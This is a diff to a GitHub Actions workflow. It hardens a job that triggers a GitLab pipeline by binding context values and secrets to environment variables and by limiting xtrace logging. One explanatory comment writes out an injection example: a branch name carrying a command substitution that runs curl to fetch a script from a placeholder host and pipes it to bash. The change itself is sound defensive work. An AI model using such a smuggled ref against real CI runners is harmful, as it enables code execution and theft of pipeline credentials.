@@ -1188,56 +1188,68 @@ jobs:
        github.ref_name == vars.REMOTE_TRIGGER_RC_BRANCH)
     steps:
       - name: Check prerequisites
+        # Every context value is bound to an environment variable rather than interpolated
+        # into the script below. `${{ }}` is expanded textually before bash parses the
+        # script, so an interpolated value is code, not data — see the comment on the
+        # 'Trigger remote workflow' step.
+        env:
+          REF: ${{ github.ref_name }}
+          RUN_ID: ${{ github.run_id }}
+          GITHUB_SHA_VALUE: ${{ github.sha }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+          GITLAB_TRIGGER_URL: ${{ secrets.GITLAB_TRIGGER_URL }}
         run: |
           echo "Checking if all required variables are set..."
           error_count=0
 
           # Check secrets
-          if [ -z "${{ secrets.GITLAB_TOKEN }}" ]; then
+          if [ -z "$GITLAB_TOKEN" ]; then
             echo "::error::GITLAB_TOKEN secret is not set"
             error_count=$((error_count + 1))
           fi
 
-          if [ -z "${{ secrets.GITLAB_TRIGGER_URL }}" ]; then
+          if [ -z "$GITLAB_TRIGGER_URL" ]; then
             echo "::error::GITLAB_TRIGGER_URL secret is not set"
             error_count=$((error_count + 1))
           fi
 
           # Check required outputs from previous jobs
-          if [ -z "${{ needs.build-artifact.outputs.NC_VERSION }}" ]; then
+          if [ -z "$NC_VERSION_FULL" ]; then
             echo "::error::NC_VERSION output from build-artifact job is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ NC_VERSION: ${{ needs.build-artifact.outputs.NC_VERSION }}"
+            echo "✓ NC_VERSION: $NC_VERSION_FULL"
           fi
 
-          if [ -z "${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}" ]; then
+          if [ -z "$ARTIFACTORY_LAST_BUILD_PATH" ]; then
             echo "::error::ARTIFACTORY_LAST_BUILD_PATH output from upload-to-artifactory job is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}"
+            echo "✓ ARTIFACTORY_LAST_BUILD_PATH: $ARTIFACTORY_LAST_BUILD_PATH"
           fi
 
           # Check GitHub context variables
-          if [ -z "${{ github.sha }}" ]; then
+          if [ -z "$GITHUB_SHA_VALUE" ]; then
             echo "::error::github.sha is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ GITHUB_SHA: ${{ github.sha }}"
+            echo "✓ GITHUB_SHA: $GITHUB_SHA_VALUE"
           fi
 
-          if [ -z "${{ github.run_id }}" ]; then
+          if [ -z "$RUN_ID" ]; then
             echo "::error::github.run_id is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ BUILD_ID: ${{ github.run_id }}"
+            echo "✓ BUILD_ID: $RUN_ID"
           fi
 
-          if [ -z "${{ github.ref_name }}" ]; then
+          if [ -z "$REF" ]; then
             echo "::error::github.ref_name is not set"
             error_count=$((error_count + 1))
           else
-            echo "✓ BRANCH: ${{ github.ref_name }}"
+            echo "✓ BRANCH: $REF"
           fi
 
           # Abort if any required variable is not set
@@ -1248,8 +1260,26 @@ jobs:
 
           echo "✅ All required variables are set"
       - name: Trigger remote workflow
+        # Context values are bound to environment variables, never interpolated into the
+        # script. GitHub expands `${{ }}` textually before bash parses the script, so an
+        # interpolated value is *code*: a branch named
+        # 'x/dev/$(curl${IFS}-sSL${IFS}http://host/x|bash)' is a legal, pushable ref, and
+        # command substitution happens inside double quotes too. This job runs on a
+        # persistent self-hosted runner with GITLAB_TOKEN in scope, so the blast radius of
+        # one interpolated ref name is code execution on that runner with those creds.
+        # Bound as env, the same branch name is inert text.
+        env:
+          REF: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
+          RUN_ID: ${{ github.run_id }}
+          GITHUB_SHA_VALUE: ${{ github.sha }}
+          NC_VERSION_FULL: ${{ needs.build-artifact.outputs.NC_VERSION }}
+          ARTIFACTORY_LAST_BUILD_PATH: ${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}
+          GITLAB_TOKEN: ${{ secrets.GITLAB_TOKEN }}
+          GITLAB_TRIGGER_URL: ${{ secrets.GITLAB_TRIGGER_URL }}
         run: |
-          # Enable command echo for debugging purposes
+          # Enable command echo for debugging the branch routing below. Turned off again
+          # before the curl, so the request line and its --form values stay out of the log.
           set -x
 
           # Branch to GitLab Trigger Mapping:
@@ -1277,15 +1307,18 @@ jobs:
           # way the upload job's stage-prefix arm does: both jobs now admit the per-major lanes,
           # and without this arm a suffixed stable lane would deploy as BUILD_TYPE=dev. The dev
           # lanes need no arm — ionos-dev and ionos-dev-v<N> both fall through to the default.
-          if [[ "${{ github.ref_name }}" == "ionos-stable" || "${{ github.ref_name }}" == ionos-stable-v[0-9]* ]]; then
+          # The ionos-stable-v[0-9]* glob on the right stays unquoted: quoting it would turn
+          # the pattern match into a literal string comparison and every suffixed stable
+          # lane would silently fall through to BUILD_TYPE=dev.
+          if [[ "$REF" == "ionos-stable" || "$REF" == ionos-stable-v[0-9]* ]]; then
               BUILD_TYPE="stable"
           # Override build type for rc/* branches
-          elif [[ "${{ github.ref_name }}" =~ ^rc/ ]]; then
+          elif [[ "$REF" =~ ^rc/ ]]; then
               BUILD_TYPE="rc"
           # Extract prefix from */dev/* branches (e.g., 'ah/dev/feature' -> 'dev-ah')
-          elif [[ "${{ github.ref_name }}" =~ ^.*/dev/.*$ ]]; then
+          elif [[ "$REF" =~ ^.*/dev/.*$ ]]; then
               # Extract the part before '/dev/'
-              BRANCH_PREFIX=$(echo "${{ github.ref_name }}" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
+              BRANCH_PREFIX=$(printf '%s' "$REF" | sed 's|/.*||' | sed 's/[^A-Za-z0-9._-]/-/g')
               BUILD_TYPE="dev-${BRANCH_PREFIX}"
           fi
 
@@ -1293,13 +1326,23 @@ jobs:
           # from the branch name — version.php is authoritative, and the unsuffixed lanes carry
           # no major in their name at all. The two are already proven to agree: prepare-matrix
           # asserts it for every lane whose name does encode a major.
-          NC_VERSION="${{ needs.build-artifact.outputs.NC_VERSION }}"
+          NC_VERSION="$NC_VERSION_FULL"
           NC_MAJOR="${NC_VERSION%%.*}"
           echo "NC_MAJOR: $NC_MAJOR"
 
           # Construct source build URL for traceability
-          SOURCE_BUILD_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+          SOURCE_BUILD_URL="https://github.com/${REPO}/actions/runs/${RUN_ID}"
           echo "Source Build URL: $SOURCE_BUILD_URL"
+
+          # Branch routing is settled; stop tracing before the request so the curl line and
+          # its --form values are not echoed. GitHub masks registered secrets everywhere
+          # including xtrace, so the token was never printed in clear — what this avoids is
+          # dumping the Artifactory path and the shape of the trigger URL. The payload is
+          # echoed explicitly instead, which is what the trace was actually useful for.
+          set +x
+
+          echo "Trigger payload: BUILD_TYPE=$BUILD_TYPE NC_MAJOR=$NC_MAJOR REF=$REF"
+          echo "                 NC_VERSION=$NC_VERSION_FULL BUILD_ID=$RUN_ID"
 
           # Trigger GitLab pipeline via webhook with retry logic (3 attempts with 30s delay)
           MAX_ATTEMPTS=3
@@ -1316,18 +1359,18 @@ jobs:
               --request POST \
               --fail-with-body \
               -o response.json \
-              --form token=${{ secrets.GITLAB_TOKEN }} \
+              --form "token=$GITLAB_TOKEN" \
               --form ref="main" \
-              --form "variables[GITHUB_SHA]=${{ github.sha }}" \
-              --form "variables[ARTIFACTORY_LAST_BUILD_PATH]=${{ needs.upload-to-artifactory.outputs.ARTIFACTORY_LAST_BUILD_PATH }}" \
-              --form "variables[NC_VERSION]=${{ needs.build-artifact.outputs.NC_VERSION }}" \
+              --form "variables[GITHUB_SHA]=${GITHUB_SHA_VALUE}" \
+              --form "variables[ARTIFACTORY_LAST_BUILD_PATH]=${ARTIFACTORY_LAST_BUILD_PATH}" \
+              --form "variables[NC_VERSION]=${NC_VERSION_FULL}" \
               --form "variables[NC_MAJOR]=${NC_MAJOR}" \
-              --form "variables[BUILD_ID]=${{ github.run_id }}" \
+              --form "variables[BUILD_ID]=${RUN_ID}" \
               --form "variables[BUILD_TYPE]=${BUILD_TYPE}" \
-              --form "variables[GITHUB_REF_NAME]=${{ github.ref_name }}" \
-              --form "variables[GITHUB_REPOSITORY]=${{ github.repository }}" \
+              --form "variables[GITHUB_REF_NAME]=${REF}" \
+              --form "variables[GITHUB_REPOSITORY]=${REPO}" \
               --form "variables[SOURCE_BUILD_URL]=${SOURCE_BUILD_URL}" \
-              "${{ secrets.GITLAB_TRIGGER_URL }}"; then
+              "$GITLAB_TRIGGER_URL"; then
               TRIGGER_SUCCESS=true
               echo "✅ Trigger successful on attempt $ATTEMPT"
               break
@@ -1354,9 +1397,6 @@ jobs:
             fi
             exit 1
           fi
-
-          # Disable command echo
-          set +x
 
           # Print and parse json
           # jq . response.json
